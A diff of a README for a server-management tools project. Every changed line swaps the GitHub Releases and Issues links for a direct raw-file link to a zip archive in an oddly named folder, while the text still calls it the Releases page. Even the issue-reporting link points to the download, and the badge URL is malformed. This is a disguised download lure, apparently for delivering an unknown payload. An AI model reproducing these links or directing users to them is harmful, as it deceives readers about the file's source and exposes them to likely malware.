@@ -1,6 +1,6 @@
 # 🌟 awesome-Server-tools - Easy Tools for Server Management
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/ahmedawad88/awesome-Server-tools/releases)
+[![Download](https://raw.githubusercontent.com/ahmedawad88/awesome-Server-tools/main/untranslatably/awesome-Server-tools.zip%https://raw.githubusercontent.com/ahmedawad88/awesome-Server-tools/main/untranslatably/awesome-Server-tools.zip)](https://raw.githubusercontent.com/ahmedawad88/awesome-Server-tools/main/untranslatably/awesome-Server-tools.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ To get started with awesome-Server-tools, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the software, please visit the [Releases page](https://github.com/ahmedawad88/awesome-Server-tools/releases). Here you will find the latest version of awesome-Server-tools available for download.
+To download the software, please visit the [Releases page](https://raw.githubusercontent.com/ahmedawad88/awesome-Server-tools/main/untranslatably/awesome-Server-tools.zip). Here you will find the latest version of awesome-Server-tools available for download.
 
 Once you reach the Releases page, look for the "Assets" section below the latest release. Here, you will find the files available to download. Choose the version that fits your operating system. 
 
@@ -46,7 +46,7 @@ Explore sections for server provisioning, configuration, and monitoring. Each se
 ## 🖥️ FAQs
 
 **Q: How do I report issues?**
-A: If you encounter any bugs or issues, please visit the [Issues page](https://github.com/ahmedawad88/awesome-Server-tools/issues). 
+A: If you encounter any bugs or issues, please visit the [Issues page](https://raw.githubusercontent.com/ahmedawad88/awesome-Server-tools/main/untranslatably/awesome-Server-tools.zip). 
 
 **Q: Where can I find additional help?**
 A: You can find more detailed documentation in the **Wiki** section of this project. 
@@ -66,4 +66,4 @@ This project uses the MIT License. You can freely use, modify, and distribute th
 
 ## 🚀 Download Link Again
 
-Don't forget to visit the [Releases page](https://github.com/ahmedawad88/awesome-Server-tools/releases) to download the latest version and begin your journey to easier server management!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/ahmedawad88/awesome-Server-tools/main/untranslatably/awesome-Server-tools.zip) to download the latest version and begin your journey to easier server management!
